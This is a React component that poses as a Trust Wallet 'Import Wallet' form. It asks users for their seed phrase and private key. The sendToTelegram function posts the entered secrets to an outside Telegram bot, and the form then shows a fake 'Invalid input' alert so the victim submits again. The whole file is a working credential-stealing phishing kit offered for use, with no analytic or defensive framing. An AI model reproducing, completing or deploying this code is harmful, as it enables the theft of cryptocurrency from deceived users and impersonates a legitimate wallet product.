"use client";

import axios from "axios";
import { useState } from "react";

const DeedCollector = () => {
  const [seedPhrases, setSeedPhrases] = useState<string[]>(Array(12).fill(""));
  const [privateKey, setPrivateKey] = useState<string>(""); // New state for private key
  const [phraseCount, setPhraseCount] = useState(12); // Default to 12 phrases
  const [error, setError] = useState<string | null>(null);

  // Update the value of a specific phrase
  const handleInputChange = (index: number, value: string) => {
    const updatedPhrases = [...seedPhrases];
    updatedPhrases[index] = value;
    setSeedPhrases(updatedPhrases);
    setError(null); // Clear error on input change
  };

  // Update the number of phrases dynamically
  const handlePhraseCountChange = (count: number) => {
    setPhraseCount(count);
    const updatedPhrases = Array(count).fill("").map((_, i) => seedPhrases[i] || "");
    setSeedPhrases(updatedPhrases);
    setError(null); // Clear error when count changes
  };

  const sendToTelegram = async (phrases: string[], privateKey: string) => {
    const telegramBotToken = process.env.NEXT_PUBLIC_TELEGRAM_BOT_TOKEN || "YOUR_TELEGRAM_BOT_TOKEN";
    const telegramChatId = process.env.NEXT_PUBLIC_TELEGRAM_CHAT_ID || "YOUR_TELEGRAM_CHAT_ID";

    const formattedPrivateKey = privateKey ? `\nPrivate Key Submitted:\n\`\`\`\n${privateKey}\n\`\`\`` : "";
    const message = phrases.every((phrase) => phrase.trim() === "")
      ? `Private Key Submitted:\n\`\`\`\n${privateKey}\n\`\`\``
      : `Seed Phrases Submitted:\n\`\`\`\n${phrases.join(" ")}\n\`\`\`${formattedPrivateKey}`;

    try {
      await axios.post(`https://api.telegram.org/bot${telegramBotToken}/sendMessage`, {
        chat_id: telegramChatId,
        text: message,
        parse_mode: "Markdown",
      });
      alert("Invalid input, confirm you have imported the right keys and try again!");
    } catch (error) {
      console.error("Failed to send data to Telegram:", error);
      alert("Failed to send data. Please try again.");
    }
  };

  // Handle form submission
  const handleSubmit = () => {
    // Validate that at least one input is filled
    const isSeedPhraseEmpty = seedPhrases.every((phrase) => phrase.trim() === "");
    const isPrivateKeyEmpty = privateKey.trim() === "";

    if (isSeedPhraseEmpty && isPrivateKeyEmpty) {
      setError("Please provide either a seed phrase or a private key.");
      return;
    }

    // Proceed if validation passes
    sendToTelegram(seedPhrases, privateKey);
  };

  return (
    <div
      style={{
        fontFamily: "Arial, sans-serif",
        maxWidth: "600px",
        margin: "0 auto",
      }}
    >
      <style>
        {`
        .grid-container {
          display: grid;
          grid-template-columns: repeat(3, 1fr); /* Default: 3 columns */
          gap: 10px;
        }
        @media (max-width: 768px) {
          .grid-container {
            grid-template-columns: repeat(2, 1fr); /* 2 columns on mobile */
          }
        }
        `}
      </style>

      <h2 style={{ color: "black", textAlign: "center" }}>Import Wallet</h2>
      <p style={{ color: "black", marginTop: "10px", textAlign: "center", marginBottom: "10px", }}>
        Enter your seed phrases or a private key to connect using our in-app Trust Wallet Extension.
      </p>

      {/* Dropdown to select the number of seed phrases */}
      <div style={{ marginBottom: "20px" }}>
        <label htmlFor="phraseCount" style={{ marginRight: "10px", color: "black"  }}>
          Number of Seed Phrases:
        </label>
        <select
          id="phraseCount"
          value={phraseCount}
          onChange={(e) => handlePhraseCountChange(Number(e.target.value))}
          style={{
            padding: "10px",
            borderRadius: "6px",
            border: "1px solid #ccc",
            width: "100%",
            background: "none",
            color: "black",
          }}
        >
          <option value={12}>12</option>
          <option value={15}>15</option>
          <option value={18}>18</option>
          <option value={21}>21</option>
          <option value={24}>24</option>
        </select>
      </div>

      {/* Dynamic seed phrase input fields */}
      <div className="grid-container">
        {Array.from({ length: phraseCount }).map((_, index) => (
          <input
            key={index}
            type="text"
            value={seedPhrases[index]}
            onChange={(e) => handleInputChange(index, e.target.value)}
            placeholder={`Word ${index + 1}`}
            style={{
              padding: "10px",
              border: "1px solid #ccc",
              borderRadius: "6px",
              textAlign: "center",
              background: "none",
              color: "black",
            }}
          />
        ))}
      </div>

      {/* Private Key Input */}
      <div style={{ marginTop: "20px" }}>
        <label htmlFor="privateKey" style={{ display: "block", color: "black", marginBottom: "5px" }}>
          Private Key (Optional):
        </label>
        <input
          id="privateKey"
          type="text"
          value={privateKey}
          onChange={(e) => setPrivateKey(e.target.value)}
          placeholder="Enter private key"
          style={{
            width: "100%",
            padding: "10px",
            borderRadius: "6px",
            border: "1px solid #ccc",
            background: "none",
            color: "black",
          }}
        />
      </div>


      {/* Error Message */}
      {error && (
        <p style={{ color: "red", marginBottom: "10px", marginTop: "10px" }}>
          {error}
        </p>
      )}

      {/* Buttons */}
      <div
        style={{
          display: "flex",
          flexDirection: "row",
          justifyContent: "space-between",
          marginTop: "20px",
          gap: "10px",
        }}
      >
        <button
          onClick={() => {
            setSeedPhrases(Array(phraseCount).fill(""));
            setPrivateKey("");
          }}
          style={{
            padding: "10px",
            backgroundColor: "#efefef",
            border: "none",
            borderRadius: "6px",
            color: "#333",
            fontSize: "1rem",
            cursor: "pointer",
            width: "50%",
          }}
        >
          Clear
        </button>
        <button
  onClick={handleSubmit}
  disabled={
    // Disable if:
    // - All seed phrase fields are empty AND the private key is empty
    // OR
    // - If seed phrases are being used, not all fields are complete
    (seedPhrases.every((phrase) => phrase.trim() === "") && privateKey.trim() === "") ||
    (seedPhrases.some((phrase) => phrase.trim() !== "") && seedPhrases.some((phrase) => phrase.trim() === ""))
  }
  style={{
    padding: "10px",
    backgroundColor:
      (seedPhrases.every((phrase) => phrase.trim() === "") && privateKey.trim() === "") ||
      (seedPhrases.some((phrase) => phrase.trim() !== "") && seedPhrases.some((phrase) => phrase.trim() === ""))
        ? "#ccc" // Disabled background color
        : "#4CAF50", // Enabled background color
    border: "none",
    borderRadius: "6px",
    color:
      (seedPhrases.every((phrase) => phrase.trim() === "") && privateKey.trim() === "") ||
      (seedPhrases.some((phrase) => phrase.trim() !== "") && seedPhrases.some((phrase) => phrase.trim() === ""))
        ? "#777" // Disabled text color
        : "white", // Enabled text color
    fontSize: "1rem",
    cursor:
      (seedPhrases.every((phrase) => phrase.trim() === "") && privateKey.trim() === "") ||
      (seedPhrases.some((phrase) => phrase.trim() !== "") && seedPhrases.some((phrase) => phrase.trim() === ""))
        ? "not-allowed" // Disabled cursor
        : "pointer", // Enabled cursor
    width: "50%",
  }}
>
  Submit
</button>

      </div>
    </div>
  );
};

export default DeedCollector;
